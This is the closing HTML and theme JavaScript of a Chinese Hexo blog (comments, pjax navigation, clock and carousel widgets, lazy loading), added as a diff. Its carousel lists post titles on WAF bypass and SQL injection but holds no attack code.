id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'iuIup4lvgEwLDu3U8Qc3GOXd-gzGzoHsz',
+      appKey: 'Ls9mJKS2MmvbfsPbPCeb2cnA',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      master: '5671db8c5f953943b68468c62e317e7e,007d3a0fdf1072ff1db83a005457a3c9,503ee756200f9eba794e5467c89e98f8'.split(','),
+      friends: ''.split(','),
+      tagMeta: '博主,小伙伴,访客'.split(','),
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script src="/js/smooth-scrolling.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // Analytics
+  if (false) {
+    MtaH5.pgv()
+  }
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/gif/loading4.gif" data-original="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e2e31796.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/yunsuo.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-23</span><a class="blog-slider__title" href="post/e2e31796.html" alt="">WAF-Bypass之SQL注入绕过云锁</a><div class="blog-slider__text">本文主要介绍:如何科学地绕过云锁WAF</div><a class="blog-slider__button" href="post/e2e31796.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e1e1fb64.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/waf.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-14</span><a class="blog-slider__title" href="post/e1e1fb64.html" alt="">WAF-Bypass之WAF介绍与分析</a><div class="blog-slider__text">本文主要介绍:WAF的工作原理以及部署方式</div><a class="blog-slider__button" href="post/e1e1fb64.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/1853c6b8.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/pgsql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-11</span><a class="blog-slider__title" href="post/1853c6b8.html" alt="">PostgreSQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:PostgreSQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/1853c6b8.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/c2f49bfa.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/c2f49bfa.html" alt="">MySQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:MySQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/c2f49bfa.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/7544e3e7.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/google.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-05</span><a class="blog-slider__title" href="post/7544e3e7.html" alt="">开源情报与搜索引擎</a><div class="blog-slider__text">本文主要介绍:使用谷歌语法搜索公开信息，利用空间测绘引擎搜索资产，使用Python脚本简单编写被动信息收集的工具</div><a class="blog-slider__button" href="post/7544e3e7.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/js/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>
